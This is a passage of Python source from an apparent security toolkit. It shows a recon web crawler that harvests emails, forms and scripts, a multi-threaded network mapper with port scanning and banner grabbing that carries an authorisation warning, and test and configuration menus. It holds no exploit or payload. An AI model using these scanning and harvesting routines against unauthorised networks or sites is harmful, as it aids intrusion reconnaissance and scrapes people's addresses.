                all_forms.append(form_info)
            
            # Extract scripts
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                all_scripts.append({
                    'url': url,
                    'src': script['src']
                })
            
            # Extract comments
            comments = soup.find_all(string=lambda text: isinstance(text, str) and text.strip().startswith('<!--'))
            for comment in comments:
                all_comments.append({
                    'url': url,
                    'comment': comment.strip()
                })
            
            crawled_pages.append({
                'url': url,
                'status': response.status_code,
                'title': soup.title.string if soup.title else 'No title',
                'emails': len(page_emails),
                'urls': len(page_urls),
                'forms': len(forms)
            })
            
            # Continue crawling if within depth limit
            if depth < max_depth:
                # Find internal links to crawl
                internal_links = []
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('/') or href.startswith(url):
                        from urllib.parse import urljoin
                        full_url = urljoin(url, href)
                        if full_url not in visited and full_url.startswith(url):
                            internal_links.append(full_url)
                
                # Crawl a limited number of internal links
                for link in internal_links[:5]:  # Limit to 5 links per page
                    crawl_page(link, depth + 1, max_depth, visited)
                    
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[red]Error crawling {url}: {e}[/red]")
            else:
                print(f"Error crawling {url}: {e}")
    
    # Execute scraping based on mode
    if scraping_mode == "1":
        # Single page analysis
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]Single Page Analysis:[/bold green] {target_url}")
        else:
            print(f"\nSingle Page Analysis: {target_url}")
        
        crawl_page(target_url, max_depth=0)
        
    elif scraping_mode == "2":
        # Multi-page crawling
        max_depth = safe_input("Enter max crawl depth (1-3, default 2): ")
        max_depth = int(max_depth) if max_depth.isdigit() and 1 <= int(max_depth) <= 3 else 2
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold yellow]Multi-Page Crawling:[/bold yellow] {target_url} (depth: {max_depth})")
        else:
            print(f"\nMulti-Page Crawling: {target_url} (depth: {max_depth})")
        
        crawl_page(target_url, max_depth=max_depth)
        
    elif scraping_mode == "3":
        # Email & URL harvesting
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold blue]Email & URL Harvesting:[/bold blue] {target_url}")
        else:
            print(f"\nEmail & URL Harvesting: {target_url}")
        
        crawl_page(target_url, max_depth=1)
        
    elif scraping_mode == "4":
        # Comprehensive reconnaissance
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold red]Comprehensive Reconnaissance:[/bold red] {target_url}")
        else:
            print(f"\nComprehensive Reconnaissance: {target_url}")
        
        crawl_page(target_url, max_depth=2)
    
    # Display results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Scraping Results:[/bold green]")
        
        # Summary table
        table = Table(title="Scraping Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan", no_wrap=True)
        table.add_column("Count", style="green", justify="right")
        
        table.add_row("Pages Crawled", str(len(crawled_pages)))
        table.add_row("Emails Found", str(len(all_emails)))
        table.add_row("URLs Found", str(len(all_urls)))
        table.add_row("Forms Found", str(len(all_forms)))
        table.add_row("Scripts Found", str(len(all_scripts)))
        table.add_row("Comments Found", str(len(all_comments)))
        
        cli_manager.console.print(table)
        
        # Display emails if found
        if all_emails:
            cli_manager.console.print(f"\n[bold yellow]Emails Found ({len(all_emails)}):[/bold yellow]")
            for email in sorted(all_emails):
                cli_manager.console.print(f"  [green]{email}[/green]")
        
        # Display forms if found
        if all_forms:
            cli_manager.console.print(f"\n[bold yellow]Forms Found ({len(all_forms)}):[/bold yellow]")
            for i, form in enumerate(all_forms[:5]):  # Show first 5
                cli_manager.console.print(f"  [cyan]Form {i+1}:[/cyan] {form['method']} {form['action']}")
                for inp in form['inputs'][:3]:  # Show first 3 inputs
                    cli_manager.console.print(f"    [white]{inp['name']}[/white] ({inp['type']})")
        
    else:
        print(f"\nScraping Results:")
        print(f"Pages Crawled: {len(crawled_pages)}")
        print(f"Emails Found: {len(all_emails)}")
        print(f"URLs Found: {len(all_urls)}")
        print(f"Forms Found: {len(all_forms)}")
        print(f"Scripts Found: {len(all_scripts)}")
        print(f"Comments Found: {len(all_comments)}")
        
        # Display emails if found
        if all_emails:
            print(f"\nEmails Found ({len(all_emails)}):")
            for email in sorted(all_emails):
                print(f"  {email}")
        
        # Display forms if found
        if all_forms:
            print(f"\nForms Found ({len(all_forms)}):")
            for i, form in enumerate(all_forms[:5]):  # Show first 5
                print(f"  Form {i+1}: {form['method']} {form['action']}")
                for inp in form['inputs'][:3]:  # Show first 3 inputs
                    print(f"    {inp['name']} ({inp['type']})")
    
    # Save comprehensive report
    report_content = f"""
Enhanced Web Scraping Report
============================
Target URL: {target_url}
Scraping Mode: {scraping_mode}
Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Summary:
- Pages Crawled: {len(crawled_pages)}
- Emails Found: {len(all_emails)}
- URLs Found: {len(all_urls)}
- Forms Found: {len(all_forms)}
- Scripts Found: {len(all_scripts)}
- Comments Found: {len(all_comments)}

Crawled Pages:
{chr(10).join([f'- {page["url"]} (Status: {page["status"]}, Title: {page["title"]})' for page in crawled_pages])}

Emails Found:
{chr(10).join([f'- {email}' for email in sorted(all_emails)])}

Forms Found:
{chr(10).join([f'- {form["method"]} {form["action"]} ({len(form["inputs"])} inputs)' for form in all_forms])}

Scripts Found:
{chr(10).join([f'- {script["src"]} (from {script["url"]})' for script in all_scripts[:20]])}

Comments Found:
{chr(10).join([f'- {comment["comment"][:100]}... (from {comment["url"]})' for comment in all_comments[:10]])}
        """
    
    report_file = save_report(report_content.strip(), "enhanced_web_scraper")
    if report_file:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[green]Report saved: {report_file}[/green]")
        else:
            print(f"\nReport saved: {report_file}")


def network_mapper():
    """Enhanced network discovery and mapping tool with subnet analysis."""
    print("\n[Enhanced Network Mapper]")
    print("⚠️  WARNING: Only scan networks you own or have explicit permission to test.")
    
    network = safe_input("Enter network (e.g., 192.168.1.0/24): ")
    if not network:
        return
    
    try:
        # Validate network
        network_obj = ipaddress.IPv4Network(network, strict=False)
    except ValueError:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid network format. Use CIDR notation (e.g., 192.168.1.0/24)[/red]")
        else:
            print(colored("Invalid network format. Use CIDR notation (e.g., 192.168.1.0/24)", Colors.FAIL))
        return
    
    # Enhanced scan options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Scan Types:[/bold cyan]")
        cli_manager.console.print("1. [green]Quick Discovery[/green] - Ping scan only (fast)")
        cli_manager.console.print("2. [yellow]Standard Scan[/yellow] - Ping + common ports (balanced)")
        cli_manager.console.print("3. [red]Comprehensive Scan[/red] - Full port scan on active hosts")
        cli_manager.console.print("4. [blue]Service Enumeration[/blue] - Detailed service mapping")
    else:
        print("\nScan Types:")
        print("1. Quick Discovery - Ping scan only (fast)")
        print("2. Standard Scan - Ping + common ports (balanced)")
        print("3. Comprehensive Scan - Full port scan on active hosts")
        print("4. Service Enumeration - Detailed service mapping")
    
    scan_type = safe_input("Select scan type (1-4): ")
    if not scan_type:
        return
    
    # Define scan parameters
    if scan_type == "1":
        scan_name = "Quick Discovery"
        port_scan = False
        service_scan = False
    elif scan_type == "2":
        scan_name = "Standard Scan"
        port_scan = True
        service_scan = False
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
    elif scan_type == "3":
        scan_name = "Comprehensive Scan"
        port_scan = True
        service_scan = False
        ports_to_scan = list(range(1, 1025))  # Well-known ports
    elif scan_type == "4":
        scan_name = "Service Enumeration"
        port_scan = True
        service_scan = True
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 1433, 1521, 5432, 6379, 27017]
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid scan type.[/red]")
        else:
            print(colored("Invalid scan type.", Colors.FAIL))
        return
    
    # Get all hosts in network
    hosts = list(network_obj.hosts())
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Starting {scan_name} on {network}[/bold green]")
        cli_manager.console.print(f"[dim]Network: {network_obj.network_address} - {network_obj.broadcast_address}[/dim]")
        cli_manager.console.print(f"[dim]Total hosts: {len(hosts)} | Port scan: {port_scan} | Service scan: {service_scan}[/dim]")
    else:
        print(f"\nStarting {scan_name} on {network}...")
        print(f"Network: {network_obj.network_address} - {network_obj.broadcast_address}")
        print(f"Total hosts: {len(hosts)} | Port scan: {port_scan} | Service scan: {service_scan}")
    
    # Phase 1: Host Discovery
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold yellow]Phase 1: Host Discovery[/bold yellow]")
    else:
        print("\nPhase 1: Host Discovery")
    
    progress = ProgressBar(len(hosts), "Host Discovery")
    active_hosts = []
    timeout = config.getint('SCANNING', 'port_scan_timeout', 3)
    
    def ping_host(host):
        """Enhanced ping with multiple methods."""
        host_str = str(host)
        try:
            # Method 1: System ping
            if os.name == 'nt':  # Windows
                result = subprocess.run(['ping', '-n', '1', '-w', str(timeout * 1000), host_str], 
                                      capture_output=True, text=True, timeout=timeout + 2)
                if result.returncode == 0:
                    return {"host": host_str, "method": "ping", "status": "active"}
            else:  # Linux/Mac
                result = subprocess.run(['ping', '-c', '1', '-W', str(timeout), host_str], 
                                      capture_output=True, text=True, timeout=timeout + 2)
                if result.returncode == 0:
                    return {"host": host_str, "method": "ping", "status": "active"}
            
            # Method 2: TCP connect to common ports
            for port in [80, 443, 22, 21]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((host_str, port))
                    sock.close()
                    if result == 0:
                        return {"host": host_str, "method": f"tcp:{port}", "status": "active"}
                except:
                    continue
            
            return None
        except:
            return None
    
    # Multi-threaded host discovery
    with ThreadPoolExecutor(max_workers=config.getint('DEFAULT', 'max_threads', 50)) as executor:
        future_to_host = {executor.submit(ping_host, host): host for host in hosts}
        
        for future in as_completed(future_to_host):
            try:
                result = future.result()
                if result:
                    active_hosts.append(result)
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"\n[green][+] Host {result['host']} is active[/green] (via {result['method']})")
                    else:
                        print(f"\n[+] Host {result['host']} is active (via {result['method']})")
                progress.update()
            except Exception as e:
                progress.update()
    
    progress.finish()
    
    # Phase 2: Port Scanning (if enabled)
    if port_scan and active_hosts:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold yellow]Phase 2: Port Scanning[/bold yellow]")
            cli_manager.console.print(f"[dim]Scanning {len(ports_to_scan)} ports on {len(active_hosts)} hosts[/dim]")
        else:
            print(f"\nPhase 2: Port Scanning")
            print(f"Scanning {len(ports_to_scan)} ports on {len(active_hosts)} hosts")
        
        total_scans = len(active_hosts) * len(ports_to_scan)
        progress = ProgressBar(total_scans, "Port Scanning")
        
        network_results = {}
        
        def scan_host_ports(host_info):
            """Scan ports on a single host."""
            host = host_info["host"]
            open_ports = []
            
            for port in ports_to_scan:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((host, port))
                    
                    if result == 0:
                        service_info = {"port": port, "service": get_service_name(port)}
                        
                        if service_scan:
                            try:
                                # Try to get banner
                                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                                if banner:
                                    service_info["banner"] = banner.strip()
                            except:
                                pass
                        
                        open_ports.append(service_info)
                    
                    sock.close()
                    progress.update()
                    
                except Exception as e:
                    progress.update()
            
            return {"host": host, "open_ports": open_ports}
        
        # Multi-threaded port scanning
        with ThreadPoolExecutor(max_workers=config.getint('DEFAULT', 'max_threads', 50)) as executor:
            future_to_host = {executor.submit(scan_host_ports, host_info): host_info for host_info in active_hosts}
            
            for future in as_completed(future_to_host):
                try:
                    result = future.result()
                    network_results[result["host"]] = result["open_ports"]
                    
                    if result["open_ports"]:
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print(f"\n[cyan]Host {result['host']}:[/cyan] {len(result['open_ports'])} open ports")
                        else:
                            print(f"\nHost {result['host']}: {len(result['open_ports'])} open ports")
                    
                except Exception as e:
                    pass
        
        progress.finish()
    
    # Display comprehensive results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]✓ Network mapping completed![/bold green]")
        
        # Summary table
        table = Table(title="Network Mapping Summary", show_header=True, header_style="bold magenta")
        table.add_column("Host", style="cyan", no_wrap=True)
        table.add_column("Status", style="green")
        table.add_column("Discovery Method", style="yellow")
        table.add_column("Open Ports", style="white")
        
        for host_info in sorted(active_hosts, key=lambda x: ipaddress.IPv4Address(x["host"])):
            host = host_info["host"]
            open_ports = network_results.get(host, []) if port_scan else []
            ports_str = f"{len(open_ports)} ports" if open_ports else "N/A"
            
            table.add_row(
                host,
                "Active",
                host_info["method"],
                ports_str
            )
        
        cli_manager.console.print(table)
        
        # Detailed port information
        if port_scan and any(network_results.values()):
            cli_manager.console.print("\n[bold yellow]Detailed Port Information:[/bold yellow]")
            
            for host in sorted(network_results.keys(), key=lambda x: ipaddress.IPv4Address(x)):
                if network_results[host]:
                    cli_manager.console.print(f"\n[cyan]Host {host}:[/cyan]")
                    for port_info in sorted(network_results[host], key=lambda x: x["port"]):
                        service_name = port_info.get("service", "unknown")
                        banner = port_info.get("banner", "")
                        cli_manager.console.print(f"  [green]{port_info['port']}/tcp[/green] - {service_name}")
                        if banner:
                            cli_manager.console.print(f"    [dim]Banner: {banner[:80]}...[/dim]")
    else:
        print(f"\n✓ Network mapping completed!")
        print(f"Active hosts: {len(active_hosts)}")
        
        for host_info in sorted(active_hosts, key=lambda x: ipaddress.IPv4Address(x["host"])):
            host = host_info["host"]
            print(f"  - {host} (via {host_info['method']})")
            
            if port_scan and host in network_results:
                open_ports = network_results[host]
                if open_ports:
                    print(f"    Open ports: {len(open_ports)}")
                    for port_info in sorted(open_ports, key=lambda x: x["port"]):
                        print(f"      {port_info['port']}/tcp - {port_info.get('service', 'unknown')}")
    
    # Enhanced report generation
    report_content = f"""
Enhanced Network Mapping Report
==============================
Network: {network}
Scan Type: {scan_name}
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Duration: {progress.elapsed_time:.2f} seconds

Network Information:
- Network Address: {network_obj.network_address}
- Broadcast Address: {network_obj.broadcast_address}
- Total Hosts: {len(hosts)}
- Active Hosts: {len(active_hosts)}

Active Hosts:
{chr(10).join([f'- {h["host"]} (via {h["method"]})' for h in sorted(active_hosts, key=lambda x: ipaddress.IPv4Address(x["host"]))])}

"""
    
    if port_scan and network_results:
        report_content += f"""
Port Scan Results:
{chr(10).join([f'Host {host}: {len(ports)} open ports' + chr(10) + chr(10).join([f'  {p["port"]}/tcp - {p.get("service", "unknown")}' for p in sorted(ports, key=lambda x: x["port"])]) for host, ports in network_results.items() if ports])}

"""
    
    report_content += f"Total Active Hosts: {len(active_hosts)}"
    
    save_report(report_content.strip(), f"enhanced_network_mapping_{network.replace('/', '_')}")
    
    logger.info(f"Enhanced network mapping completed on {network}: {len(active_hosts)} active hosts found")


def get_service_name(port):
    """Get service name for common ports."""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
        995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
    }
    return services.get(port, "Unknown")


def run_test_suite():
    """Run the comprehensive test suite with enhanced quality assurance."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Test Suite & Quality Assurance[/bold blue]", border_style="blue"))
        console.print("[bold cyan]Comprehensive testing and quality assurance system[/bold cyan]")
    else:
        print("\n[Enhanced Test Suite & Quality Assurance]")
        print("Comprehensive testing and quality assurance system")
    
    # Define testing options
    testing_options = [
        (1, "Run All Tests", "Comprehensive unit, integration, validation, and safety tests"),
        (2, "Unit Tests Only", "Test individual modules and functions"),
        (3, "Integration Tests Only", "Test end-to-end tool workflows"),
        (4, "Validation Tests Only", "Test input validation and data integrity"),
        (5, "Safety Tests Only", "Test safety measures and destructive operations"),
        (6, "Quality Assurance Report", "Generate comprehensive QA report"),
        (7, "Safe Mode Management", "Configure safe mode and safety settings"),
        (8, "Error Analysis", "Analyze error patterns and statistics"),
        (9, "Back to Main Menu", "Return to main toolkit menu")
    ]
    
    while True:
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Testing Options:[/bold cyan]")
            for num, name, desc in testing_options:
                console.print(f"[green]{num}.[/green] [bold]{name}[/bold] - {desc}")
        else:
            print("\nTesting Options:")
            for num, name, desc in testing_options:
                print(f"{num}. {name} - {desc}")
        
        choice = safe_input("\nSelect an option (0-9): ")
        
        if choice == "0":
            return
        
        elif choice == "1":
            run_comprehensive_tests()
        
        elif choice == "2":
            run_unit_tests_only()
        
        elif choice == "3":
            run_integration_tests_only()
        
        elif choice == "4":
            run_validation_tests_only()
        
        elif choice == "5":
            run_safety_tests_only()
        
        elif choice == "6":
            generate_qa_report()
        
        elif choice == "7":
            manage_safe_mode()
        
        elif choice == "8":
            analyze_errors()
        
        elif choice == "9":
            return
        
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please select 0-9.[/red]")
            else:
                print(colored("Invalid option. Please select 0-9.", Colors.FAIL))


def run_comprehensive_tests():
    """Run all test categories."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Running Comprehensive Tests[/bold blue]", border_style="blue"))
    else:
        print("\n[Running Comprehensive Tests]")
    
    try:
        results = qa_system.run_comprehensive_tests()
        
        if RICH_AVAILABLE:
            # Display results in a table
            table = Table(title="Test Results Summary")
            table.add_column("Test Category", style="cyan", no_wrap=True)
            table.add_column("Passed", style="green")
            table.add_column("Failed", style="red")
            table.add_column("Success Rate", style="yellow")
            
            for category, data in results.items():
                total = data['passed'] + data['failed']
                if total > 0:
                    success_rate = (data['passed'] / total) * 100
                    table.add_row(
                        category.replace('_', ' ').title(),
                        str(data['passed']),
                        str(data['failed']),
                        f"{success_rate:.1f}%"
                    )
            
            console.print(table)
            
            # Overall summary
            total_passed = sum(cat['passed'] for cat in results.values())
            total_failed = sum(cat['failed'] for cat in results.values())
            total_tests = total_passed + total_failed
            
            if total_tests > 0:
                overall_success = (total_passed / total_tests) * 100
                if overall_success >= 90:
                    console.print(f"[bold green]✓ Overall Success Rate: {overall_success:.1f}%[/bold green]")
                elif overall_success >= 75:
                    console.print(f"[bold yellow]⚠ Overall Success Rate: {overall_success:.1f}%[/bold yellow]")
                else:
                    console.print(f"[bold red]❌ Overall Success Rate: {overall_success:.1f}%[/bold red]")
        
        else:
            print("\nTest Results Summary:")
            print("-" * 50)
            for category, data in results.items():
                total = data['passed'] + data['failed']
                if total > 0:
                    success_rate = (data['passed'] / total) * 100
                    print(f"{category.replace('_', ' ').title()}: {data['passed']} passed, {data['failed']} failed ({success_rate:.1f}%)")
            
            # Overall summary
            total_passed = sum(cat['passed'] for cat in results.values())
            total_failed = sum(cat['failed'] for cat in results.values())
            total_tests = total_passed + total_failed
            
            if total_tests > 0:
                overall_success = (total_passed / total_tests) * 100
                print(f"\nOverall Success Rate: {overall_success:.1f}%")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error running comprehensive tests: {e}[/red]")
        else:
            print(colored(f"❌ Error running comprehensive tests: {e}", Colors.FAIL))


def run_unit_tests_only():
    """Run unit tests only."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Running Unit Tests[/bold blue]", border_style="blue"))
    else:
        print("\n[Running Unit Tests]")
    
    try:
        qa_system._run_unit_tests()
        results = qa_system.test_results['unit_tests']
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ Unit Tests Completed[/green]")
            console.print(f"[green]Passed: {results['passed']}[/green]")
            console.print(f"[red]Failed: {results['failed']}[/red]")
        else:
            print(f"✓ Unit Tests Completed")
            print(f"Passed: {results['passed']}")
            print(f"Failed: {results['failed']}")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error running unit tests: {e}[/red]")
        else:
            print(colored(f"❌ Error running unit tests: {e}", Colors.FAIL))


def run_integration_tests_only():
    """Run integration tests only."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Running Integration Tests[/bold blue]", border_style="blue"))
    else:
        print("\n[Running Integration Tests]")
    
    try:
        qa_system._run_integration_tests()
        results = qa_system.test_results['integration_tests']
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ Integration Tests Completed[/green]")
            console.print(f"[green]Passed: {results['passed']}[/green]")
            console.print(f"[red]Failed: {results['failed']}[/red]")
        else:
            print(f"✓ Integration Tests Completed")
            print(f"Passed: {results['passed']}")
            print(f"Failed: {results['failed']}")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error running integration tests: {e}[/red]")
        else:
            print(colored(f"❌ Error running integration tests: {e}", Colors.FAIL))


def run_validation_tests_only():
    """Run validation tests only."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Running Validation Tests[/bold blue]", border_style="blue"))
    else:
        print("\n[Running Validation Tests]")
    
    try:
        qa_system._run_validation_tests()
        results = qa_system.test_results['validation_tests']
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ Validation Tests Completed[/green]")
            console.print(f"[green]Passed: {results['passed']}[/green]")
            console.print(f"[red]Failed: {results['failed']}[/red]")
        else:
            print(f"✓ Validation Tests Completed")
            print(f"Passed: {results['passed']}")
            print(f"Failed: {results['failed']}")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error running validation tests: {e}[/red]")
        else:
            print(colored(f"❌ Error running validation tests: {e}", Colors.FAIL))


def run_safety_tests_only():
    """Run safety tests only."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Running Safety Tests[/bold blue]", border_style="blue"))
    else:
        print("\n[Running Safety Tests]")
    
    try:
        qa_system._run_safety_tests()
        results = qa_system.test_results['safety_tests']
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ Safety Tests Completed[/green]")
            console.print(f"[green]Passed: {results['passed']}[/green]")
            console.print(f"[red]Failed: {results['failed']}[/red]")
        else:
            print(f"✓ Safety Tests Completed")
            print(f"Passed: {results['passed']}")
            print(f"Failed: {results['failed']}")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error running safety tests: {e}[/red]")
        else:
            print(colored(f"❌ Error running safety tests: {e}", Colors.FAIL))


def generate_qa_report():
    """Generate comprehensive quality assurance report."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Quality Assurance Report[/bold blue]", border_style="blue"))
    else:
        print("\n[Quality Assurance Report]")
    
    try:
        # Generate report
        report_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'test_results': qa_system.test_results,
            'error_summary': error_handler.get_error_summary(),
            'safe_mode_status': qa_system.safe_mode,
            'destructive_operations_disabled': qa_system.destructive_operations_disabled
        }
        
        # Save report
        report_file = Path("reports") / f"qa_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        report_file.parent.mkdir(exist_ok=True)
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ QA Report generated: {report_file}[/green]")
            
            # Display summary
            table = Table(title="QA Report Summary")
            table.add_column("Metric", style="cyan")
            table.add_column("Value", style="green")
            
            total_tests = sum(cat['passed'] + cat['failed'] for cat in qa_system.test_results.values())
            total_errors = error_handler.error_count
            
            table.add_row("Total Tests", str(total_tests))
            table.add_row("Total Errors", str(total_errors))
            table.add_row("Safe Mode", "Enabled" if qa_system.safe_mode else "Disabled")
            table.add_row("Destructive Ops", "Blocked" if qa_system.destructive_operations_disabled else "Allowed")
            
            console.print(table)
        else:
            print(f"✓ QA Report generated: {report_file}")
            print(f"Total Tests: {total_tests}")
            print(f"Total Errors: {total_errors}")
            print(f"Safe Mode: {'Enabled' if qa_system.safe_mode else 'Disabled'}")
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error generating QA report: {e}[/red]")
        else:
            print(colored(f"❌ Error generating QA report: {e}", Colors.FAIL))


def manage_safe_mode():
    """Manage safe mode and safety settings."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Safe Mode Management[/bold blue]", border_style="blue"))
    else:
        print("\n[Safe Mode Management]")
    
    while True:
        if RICH_AVAILABLE:
            console.print(f"\n[cyan]Current Status:[/cyan]")
            console.print(f"Safe Mode: [{'green' if qa_system.safe_mode else 'red'}]{'Enabled' if qa_system.safe_mode else 'Disabled'}[/]")
            console.print(f"Destructive Operations: [{'red' if qa_system.destructive_operations_disabled else 'green'}]{'Blocked' if qa_system.destructive_operations_disabled else 'Allowed'}[/]")
            
            console.print("\n[cyan]Options:[/cyan]")
            console.print("[green]1.[/green] Enable Safe Mode")
            console.print("[green]2.[/green] Disable Safe Mode")
            console.print("[green]3.[/green] View Safety Settings")
            console.print("[green]4.[/green] Back to Test Menu")
        else:
            print(f"\nCurrent Status:")
            print(f"Safe Mode: {'Enabled' if qa_system.safe_mode else 'Disabled'}")
            print(f"Destructive Operations: {'Blocked' if qa_system.destructive_operations_disabled else 'Allowed'}")
            
            print("\nOptions:")
            print("1. Enable Safe Mode")
            print("2. Disable Safe Mode")
            print("3. View Safety Settings")
            print("4. Back to Test Menu")
        
        choice = safe_input("\nSelect option (1-4): ")
        
        if choice == "1":
            qa_system.enable_safe_mode()
            if RICH_AVAILABLE:
                console.print("[green]✓ Safe mode enabled[/green]")
            else:
                print(colored("✓ Safe mode enabled", Colors.OKGREEN))
        
        elif choice == "2":
            qa_system.disable_safe_mode()
            if RICH_AVAILABLE:
                console.print("[yellow]⚠ Safe mode disabled[/yellow]")
            else:
                print(colored("⚠ Safe mode disabled", Colors.WARNING))
        
        elif choice == "3":
            view_safety_settings()
        
        elif choice == "4":
            return
        
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please select 1-4.[/red]")
            else:
                print(colored("Invalid option. Please select 1-4.", Colors.FAIL))


def view_safety_settings():
    """View current safety settings and defaults."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Safety Settings[/bold blue]", border_style="blue"))
    else:
        print("\n[Safety Settings]")
    
    if RICH_AVAILABLE:
        table = Table(title="Safe Defaults")
        table.add_column("Category", style="cyan")
        table.add_column("Setting", style="yellow")
        table.add_column("Safe Default", style="green")
        
        for category, settings in safe_defaults.defaults.items():
            for setting, value in settings.items():
                table.add_row(category, setting, str(value))
        
        console.print(table)
    else:
        print("Safe Defaults:")
        print("-" * 50)
        for category, settings in safe_defaults.defaults.items():
            print(f"\n{category}:")
            for setting, value in settings.items():
                print(f"  {setting}: {value}")


def analyze_errors():
    """Analyze error patterns and statistics."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Error Analysis[/bold blue]", border_style="blue"))
    else:
        print("\n[Error Analysis]")
    
    error_summary = error_handler.get_error_summary()
    
    if RICH_AVAILABLE:
        table = Table(title="Error Statistics")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Total Errors", str(error_summary['total_errors']))
        table.add_row("Critical Errors", str(error_summary['critical_errors']))
        table.add_row("Error Types", str(len(error_summary['error_types'])))
        
        console.print(table)
        
        if error_summary['error_types']:
            console.print("\n[cyan]Error Type Distribution:[/cyan]")
            for error_type, count in error_summary['error_types'].items():
                console.print(f"[red]{error_type}:[/red] {count}")
        
        if error_summary['recent_errors']:
            console.print("\n[cyan]Recent Errors:[/cyan]")
            for error in error_summary['recent_errors']:
                console.print(f"[red]• {error['error_message']}[/red]")
    else:
        print("Error Statistics:")
        print(f"Total Errors: {error_summary['total_errors']}")
        print(f"Critical Errors: {error_summary['critical_errors']}")
        print(f"Error Types: {len(error_summary['error_types'])}")
        
        if error_summary['error_types']:
            print("\nError Type Distribution:")
            for error_type, count in error_summary['error_types'].items():
                print(f"  {error_type}: {count}")
        
        if error_summary['recent_errors']:
            print("\nRecent Errors:")
            for error in error_summary['recent_errors']:
                print(f"  • {error['error_message']}")


def configuration_menu():
    """Enhanced configuration management menu."""
    config_options = [
        (1, "View Current Configuration", "Display all current settings"),
        (2, "Edit Configuration", "Modify specific settings"),
        (3, "Reset to Defaults", "Restore default configuration"),
        (4, "Export Configuration", "Save configuration to file"),
        (5, "Import Configuration", "Load configuration from file"),
        (0, "Back to Main Menu", "Return to main menu")
    ]
    
    while True:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel.fit("[bold blue]Configuration Management[/bold blue]", style="blue"))
            
            table = Table(title="Configuration Options", show_header=True, header_style="bold magenta")
            table.add_column("Option", style="cyan", no_wrap=True)
            table.add_column("Action", style="green")
            table.add_column("Description", style="white")
            
            for option, action, description in config_options:
                table.add_row(str(option), action, description)
            
            cli_manager.console.print(table)
        else:
            print("\n[Configuration Menu]")
            for option, action, description in config_options:
                print(f"{option}. {action}")
                if cli_manager.show_descriptions:
                    print(f"    {description}")
        
